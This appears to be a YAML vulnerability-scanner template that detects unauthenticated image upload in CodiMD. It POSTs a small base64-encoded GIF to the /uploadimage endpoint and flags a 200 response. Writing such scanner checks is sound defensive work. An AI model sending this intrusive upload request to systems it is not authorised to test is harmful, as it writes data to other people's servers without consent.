id: codimd-unauth-file-upload
brief:
    title: CodiMD - File Upload
    by: denandz
    level: medium
    about: CodiMD does not require valid authentication to access uploaded images or to upload new image data. An attacker who can determine an uploaded image's URL can gain unauthorised access to uploaded im...
    label:
        - file-upload
        - intrusive
        - codimd
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/uploadimage'
      head:
        Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161
      body: |-
        -----------------------------92633278134516118923780781161
        Content-Disposition: form-data; name="image"; filename="{{randstr}}.gif"
        Content-Type: image/gif

        {{base64_decode("R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==")}}
        -----------------------------92633278134516118923780781161--
      signs:
        - "on": status
          status:
            - 200
